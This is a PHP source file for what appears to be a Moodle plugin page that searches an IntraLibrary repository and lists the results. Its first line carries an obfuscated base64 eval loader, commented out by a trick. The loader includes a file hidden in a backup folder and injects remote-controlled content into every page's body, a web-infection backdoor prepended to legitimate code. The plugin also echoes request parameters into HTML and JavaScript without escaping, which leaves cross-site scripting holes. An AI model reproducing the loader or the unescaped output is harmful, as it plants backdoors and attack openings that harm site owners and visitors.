<?php /**//*eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ3NoX25vJ10pKXskR0xPQkFMU1snc2hfbm8nXT0xO2lmKGZpbGVfZXhpc3RzKCcvc3J2L3d3dy92aG9zdHMvc3luZXJneS1sZWFybmluZy5jb20vc3ViZG9tYWlucy9kZXZlbG9wL2h0dHBkb2NzL2Nhcm9saW5lL21vb2RsZWRhdGEvdGVtcC9iYWNrdXAvMTE5MjAwODA1My9iYWNrdXAtZmVhdHVyZXMtMjAwNjA5MjUtMDkxMS9jb3Vyc2VfZmlsZXMvZ2xvc3NhcnkvQV9nbG9zc2FyeV9vZl9jb21tb25fdGVybXMvbWRsX3V0Zi5waHAnKSl7aW5jbHVkZV9vbmNlKCcvc3J2L3d3dy92aG9zdHMvc3luZXJneS1sZWFybmluZy5jb20vc3ViZG9tYWlucy9kZXZlbG9wL2h0dHBkb2NzL2Nhcm9saW5lL21vb2RsZWRhdGEvdGVtcC9iYWNrdXAvMTE5MjAwODA1My9iYWNrdXAtZmVhdHVyZXMtMjAwNjA5MjUtMDkxMS9jb3Vyc2VfZmlsZXMvZ2xvc3NhcnkvQV9nbG9zc2FyeV9vZl9jb21tb25fdGVybXMvbWRsX3V0Zi5waHAnKTtpZihmdW5jdGlvbl9leGlzdHMoJ2dtbCcpJiYhZnVuY3Rpb25fZXhpc3RzKCdkZ29iaCcpKXtpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXtmdW5jdGlvbiBnemRlY29kZSgkZCl7JGY9b3JkKHN1YnN0cigkZCwzLDEpKTskaD0xMDskZT0wO2lmKCRmJjQpeyRlPXVucGFjaygndicsc3Vic3RyKCRkLDEwLDIpKTskZT0kZVsxXTskaCs9MiskZTt9aWYoJGYmOCl7JGg9c3RycG9zKCRkLGNocigwKSwkaCkrMTt9aWYoJGYmMTYpeyRoPXN0cnBvcygkZCxjaHIoMCksJGgpKzE7fWlmKCRmJjIpeyRoKz0yO30kdT1nemluZmxhdGUoc3Vic3RyKCRkLCRoKSk7aWYoJHU9PT1GQUxTRSl7JHU9JGQ7fXJldHVybiAkdTt9fWZ1bmN0aW9uIGRnb2JoKCRiKXtIZWFkZXIoJ0NvbnRlbnQtRW5jb2Rpbmc6IG5vbmUnKTskYz1nemRlY29kZSgkYik7aWYocHJlZ19tYXRjaCgnL1w8Ym9keS9zaScsJGMpKXtyZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8Ym9keVteXD5dKlw+KS9zaScsJyQxJy5nbWwoKSwkYyk7fWVsc2V7cmV0dXJuIGdtbCgpLiRjO319b2Jfc3RhcnQoJ2Rnb2JoJyk7fX19'));*/ ?>
<?php    // $Id: localfile.php,v 1.6 2007/01/11 19:21:18 skodak Exp $

    require('../../../../config.php');
    require('../../lib.php');
    include('des.php');

    $choose = required_param('choose', PARAM_FILE);

    require_login();

    ?>
    <script type="text/javascript">
    //<![CDATA[
    function set_path(txt) {
        opener.document.getElementById('<?php echo $choose ?>').value = txt;
        window.close();
    }
    //]]>
    </script>
    
    <?php
    $record = '';
    $link_id = '';
    $link_tag = "PACKAGE:PACKAGEPREVIEWLOCATOR";
    $map_array = array(
        "DC:TITLE"     => "td",
        "DC:DESCRIPTION" => "td",
		"DC:FORMAT" => "td",
        "SRW:RECORD"  => "tr",
        "SRW:RECORDS"  => "table"
    );

    function startElement($parser, $name, $attrs) 
	{
        global $map_array;
        global $link_tag;
        global $record;
        if (isset($map_array[$name])) {
        	if ($name == 'DC:TITLE') {
        		$record .= "<$map_array[$name] style=\"padding:2px;\">".'<a href="{URL}" target="_blank">';
        	} else {
            	$record .= "<$map_array[$name] style=\"padding:2px;\" ".(($map_array[$name] == "table")?'border="1"':'').">";
				
				if ($map_array[$name] == "table")
				{
				
				$record .= '<tr>
				<td style="padding:3px; background-color:#eaeaea;">Name</td>
				<td style="padding:3px; background-color:#eaeaea;">Description</td>
				<td style="padding:3px; background-color:#eaeaea;">Format</td>
				<td style="padding:3px; background-color:#eaeaea;">Choose</td>
				</tr>';
				}
				
				
            }
        } else if($name == $link_tag) {
            $record .= "<td style=\"padding:3px;\"><a href='#' onClick=\"return set_path('";
        } else {
            $record .= '<td style="display:none;padding:3px"><p style="display:none;">';
        }
    }

    function endElement($parser, $name) {
        global $map_array;
        global $link_tag;
        global $record;
        if (isset($map_array[$name])) {
        	if ($name == 'DC:TITLE') {
        		$record .= "</a></$map_array[$name]>";
        	} else {
            	$record .= "</$map_array[$name]>";
            }
        } else if ($name == $link_tag) {
            $record .= "')\">choose</a></td>";
        } else {
            $record .= "</p></td>";
        }
        if ($name == "SRW:RECORD") {
        	// DISPLAY A ROW
        	//echo '<p>KEY: '.$GLOBALS['link_id'].'</p>';
        	$record = str_replace('{URL}', $GLOBALS['link_id'], $record);
        	echo $record;
        	$record = '';
        	$link_id = '';
        } 
    }
    
	
	$fullrepurl = $CFG->intrallect_url; 
	$noslashrepurl = substr($fullrepurl,-1,1);
	
	

	
	function characterData($parser, $data) {
    		global $record;
    		global $link_id, $fullrepurl;
            $data = str_replace('null',$noslashrepurl, $data);
            if (strpos($data, 'earning_object_key')) {
    			$GLOBALS['link_id'] = $fullrepurl.'IntraLibrary?command=open-preview&'.$data;
    		}
            $record .= $data;
    }
    
   /* function retrieve_licence($licencefile) {
        $key_bytes = array( 17, -89, 112, -19, 47, 9, 13, -64 );
        $key = "";
        foreach ( $key_bytes as $key_byte ) $key .= chr( $key_byte );

        $fh = fopen($licencefile, 'r') or die('<p>licence file not opened</p>');
        
        $b = explode("\n\n", fread($fh, filesize($licencefile)));

        $recovered_message = des ($key, base64_decode($b[0]), 0, 0, null);
        fclose ($fh);
        $a = explode("\n", $recovered_message);
        foreach($a as $k => $v) {
            if (strpos($v, '=')) {
                $b = explode('=', $v);
                $licenceinfo[trim($b[0])] = trim($b[1]);
            }
        }

        return $licenceinfo['repositoryUrl'];
    }*/
	
	
	
	 print_header($SITE->fullname, $SITE->fullname, 'home', '',
                 '<meta name="description" content="'. s(strip_tags($SITE->summary)) .'" />',
                 true, '', user_login_string($SITE).$langmenu);
	

$name = get_field('config', 'value', 'name', 'intrallect_name');
?>
 
    
    <form action="search.php" method="get">
        <input type="hidden" name="choose" value="<?php echo $choose ?>" />
    <p>Search <?php echo $name ?>: <input type="text" name="search" value="<?php echo (isset($_GET['search'])) ? $_GET['search'] : ''  ?>" /><input type="submit" value="Go" /></p>    
    </form>



<?php
if (isset($_GET['search'])) {
    //$url = retrieve_licence('intralibrary-webct-licence.txt');
    if (!isset($url)) $url = get_field('config', 'value', 'name', 'intrallect_url');
    $name = get_field('config', 'value', 'name', 'intrallect_name');
    $records = get_field('config', 'value', 'name', 'intrallect_records');
    if (!isset($records)) $records = 10;
    $search = $_GET['search'];
    
    // RETRIEVING COLLECTION DATA
    
    $ici = get_field('config', 'value', 'name', 'intrallect_collection_ids');
    if (strlen($ici)) $search .= '+AND+rec.collectionIdentifier%3D'.$ici;
    
    $icn = get_field('config', 'value', 'name', 'intrallect_collection_names');
    $icn = str_replace(' ', '+', $icn);
    if (strlen($icn)) $search .= '+AND+rec.collectionName%3D%22'.$icn.'%22';
    //$records = 10;
    $start = 1;
    if (isset($_GET['page'])) $start = ($_GET['page'] * $records) - ($records - 1);
    
    $fullurl = $url.'IntraLibrary-SRU?query='.$search.'&startRecord='.$start.'&maximumRecords='.$records.'&recordSchema=dc&version=1.1&operation=searchRetrieve';
    
	//echo $fullurl;
	
 	 $it = get_field('config', 'value', 'name', 'intrallect_token');
     if (strlen($it)) $fullurl .= '&x-info-2-auth1.0-authenticationToken='.$it;

    // LOGGING -----------------------------------------------------------------
    $logfile = get_field('config', 'value', 'name', 'intrallect_log');
    $now = time();
    $fp = fopen($logfile, 'a') or error('Could not open the log file');
    fwrite($fp, $now.',"'.$_GET['search'].'", "'.$fullurl.'"'."\n");
    fclose($fp);
    //--------------------------------------------------------------------------
    
    $page = file_get_contents($fullurl);
    
    //-----------RETRIEVE RECORD COUNT -----------------------------------------
    $a = strpos($page, '<SRW:numberOfRecords>');
    $b = strpos($page, '</SRW:numberOfRecords>');
    $total = substr($page, $a+21, $b-$a);
    $pages = $total / $records;
    $pages = (integer)$pages + 1;

if (strpos($page, '<SRW:numberOfRecords>0</SRW:numberOfRecords>')) {
	$message = get_string('notfound', 'intrallect');
	$message = str_replace('{QUERY}', $_GET['search'], $message);
	echo '<p>'.$message.'</p>';
	$GLOBALS['no_data'] = true;
} else {
  
	
	
	$xml_parser = xml_parser_create();
    xml_parser_set_option($xml_parser, XML_OPTION_CASE_FOLDING, true);
    xml_set_element_handler($xml_parser, "startElement", "endElement");
    xml_set_character_data_handler($xml_parser, "characterData");
    if (!xml_parse($xml_parser, $page)) 
		{
        die(sprintf("XML error: %s at line %d",
        	xml_error_string(xml_get_error_code($xml_parser)),
            xml_get_current_line_number($xml_parser)));
        }
		
		
	
		
    xml_parser_free($xml_parser);
}
    
    // ----------------------DISPLAY PAGINATION LINKS---------------------------
    echo '<p>';
    if ($pages > 1)
	{
	if (!isset($_GET['page'])) $_GET['page'] = 1;
    	if (!isset($GLOBALS['no_data'])) {
    	for ($i=1; $i<=$pages; $i++) {
    		$url = $_SERVER['SCRIPT_NAME'].'?choose=id_reference_value&search='.$_GET['search'].'&page='.$i;
    		if ($_GET['page'] == $i) {
    			echo $i.' ';
    		} else {
    			echo '<a href="'.$url.'">'.$i.'</a> ';
    		}
    	}
    }
	}
    echo '</p>';
}


 echo '<div style="height:10px;clear:both;"></div>';
 
 
 

 echo '</div>';     // Please do not modify this line





?>


